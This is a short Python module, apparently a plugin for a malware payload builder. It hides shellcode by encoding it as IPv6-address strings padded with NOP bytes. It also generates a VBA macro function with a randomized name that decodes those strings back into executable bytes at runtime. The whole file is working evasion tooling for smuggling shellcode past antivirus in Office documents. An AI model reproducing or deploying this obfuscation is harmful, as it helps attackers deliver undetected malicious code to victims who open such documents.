import random
import string

class IPv6Obfuscate:

    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))

    def imports(self):
        return []

    def codeblock(self):
        return """
Private Function {name}(addresses)
    Dim arrayLength as Long
    Dim outArray() As Byte
    Dim quartets() As string

    arrayLength = UBound(addresses) - LBound(addresses) + 1
    Redim outArray(arrayLength * 16)
    Dim i As Long
    For i=LBound(addresses) To UBound(addresses) - 1
        quartets = Split(addresses(i), ":")
        For j=LBound(quartets) To UBound(quartets)
            outArray(i*16 + j*2) = CLng("&h" & quartets(j)) \\ 256
            outArray(i*16 + j*2 + 1) = CLng("&h" & quartets(j)) And 255
        Next j
    Next i

    {name} = outArray
End Function
""".format(name = self.name)
    
    def compilerOptions(self):
        return []

    def obfuscate(self, decoded):
        encoded = []
        for i in range(0, len(decoded), 16):
            chunk = decoded[i:i+16]
            if len(chunk) < 16:
                chunk = chunk + (b"\x90" * (16 - len(chunk)))
            encoded.append(':'.join([ f'{chunk[n]:02x}{chunk[n+1]:02x}' for n in range(0, 16, 2)]))
        return encoded

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')